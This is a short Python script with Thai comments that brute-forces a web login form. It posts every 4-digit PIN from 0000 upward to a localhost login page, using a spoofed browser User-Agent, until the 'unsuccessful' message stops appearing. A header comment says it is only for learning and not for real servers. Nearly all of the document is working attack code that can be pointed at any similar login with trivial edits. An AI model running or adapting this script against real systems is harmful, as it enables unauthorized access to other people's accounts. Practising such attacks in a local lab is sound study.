'''
Code by T.S
beware to use
don't use in real server
just use for learning

'''

import requests

session = requests.Session()

login_url = "http://localhost/dashboard/login.php"
dashboard_url = "http://localhost/dashboard/index.html"


payload = {
    'email': 'vichai54@example.com',
    'password': '0000',  #'wSysIcK0ts',
    'csrf_token': 'extracted_token_if_needed' # บางระบบต้องการค่านี้
}


headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    'Referer': login_url # ช่วยระบุแหล่งที่มาตามมาตรฐาน Referer Header
}

def update_password(data_dict, new_password):   
    data_dict['password'] = new_password    



try:
    
  success = False
  run = 0
  while success == False:
    val = f"{run:04}"
    print("shoot by ", payload['password'])
    response = session.post(login_url, data=payload, headers=headers)
    
    if "ไม่สำเร็จ" in response.text:
        print("Login Not Successful!")  
        update_password(payload, val)      
        run += 1
    else:
        print("Login sucess! ==> password = " , payload['password'])
        success = True         

except Exception as e:
    print(f"An error occurred: {e}")
